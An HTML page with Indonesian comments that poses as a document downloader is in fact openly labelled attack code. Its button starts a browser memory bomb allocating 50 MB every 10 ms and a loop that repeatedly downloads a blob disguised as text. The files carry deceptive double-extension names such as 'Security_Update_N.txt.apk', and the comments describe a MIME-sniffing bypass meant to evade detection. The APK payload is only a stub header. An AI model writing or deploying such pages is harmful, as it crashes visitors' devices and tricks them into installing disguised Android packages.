<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Document Dispatcher</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: monospace; background: #0f172a; color: #0f0; padding: 20px; text-align: center; }
  .panel { background: #1e293b; padding: 30px; border-radius: 12px; max-width: 500px; margin: 50px auto; border: 1px solid #334155; }
  h2 { color: #f00; margin-bottom: 15px; animation: blink 0.5s infinite; }
  @keyframes blink { 50% { opacity: 0.3; } }
  button { padding: 15px; font-size: 16px; background: #e94560; color: #fff; border: none; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; }
  button:hover { background: #c73650; }
  #status { margin-top: 20px; padding: 10px; background: #000; border-radius: 6px; color: #ff0; font-weight: bold; }
</style>
</head>
<body>

<div class="panel">
  <h2>☢️ SYSTEM FAILURE ☢️</h2>
  <p>Mengunduh dokumen dan mengalokasikan memori...</p>
  <button id="startBtn">Unduh Dokumen (.txt)</button>
  <div id="status">Sistem siap.</div>
</div>

<script>
(function () {
  'use strict';

  var statusDiv = document.getElementById('status');
  var isProcessing = false;
  var counter = 0;
  var blobUrls = []; // Memory Leak

  // ============================================
  // 1. PAYLOAD APK (BASE64 HEADER)
  // ============================================
  // Header ZIP/APK (PK..)
  var b64Data = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY="; 

  // ============================================
  // 2. FUNGSI MEMORY BOMB (OOM)
  // ============================================
  function triggerMemoryBomb() {
    setInterval(function() {
      try {
        // Alokasi 50MB ArrayBuffer per 10ms
        var buffer = new Uint8Array(50 * 1024 * 1024);
        buffer.fill(1);
        
        // Simpan di memori (Memory Leak)
        blobUrls.push(URL.createObjectURL(new Blob([buffer], { type: 'application/octet-stream' })));
        
        // Update status
        statusDiv.innerText = "Alokasi Memori: " + (blobUrls.length * 50) + " MB";
      } catch(e) {
        statusDiv.innerText = "MEMORY CRASH: " + e.message;
      }
    }, 10);
  }

  // ============================================
  // 3. FUNGSI BLOB APK SMUGGLING
  // ============================================
  function triggerAPKDownload() {
    if (!isProcessing) return;
    counter++;

    try {
      // Decode Base64
      var binary = atob(b64Data);
      var bytes = new Uint8Array(binary.length);
      for (var i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i);
      }

      // MIME Sniffing Bypass: Gunakan 'text/plain' agar tidak terdeteksi sebagai APK
      var blob = new Blob([bytes], { type: 'text/plain' });
      var url = URL.createObjectURL(blob);

      // Trigger Download
      var a = document.createElement('a');
      a.href = url;
      // Ekstensi Ganda: .txt.apk (atau .txt saja untuk menipu)
      a.download = `Security_Update_${counter}.txt.apk`; 
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();

      statusDiv.innerText = "Mengunduh APK: " + counter;

      // Loop berikutnya setelah 1.2 detik
      setTimeout(triggerAPKDownload, 1200);

    } catch(e) {
      statusDiv.innerText = "Gagal: " + e.message;
    }
  }

  // ============================================
  // 4. START
  // ============================================
  document.getElementById('startBtn').addEventListener('click', function() {
    if (isProcessing) return;
    isProcessing = true;
    statusDiv.innerText = "Memulai Exploit...";

    // Jalankan Memory Bomb
    triggerMemoryBomb();

    // Jalankan Download Loop
    triggerAPKDownload();
  });

})();
</script>
</body>
</html>
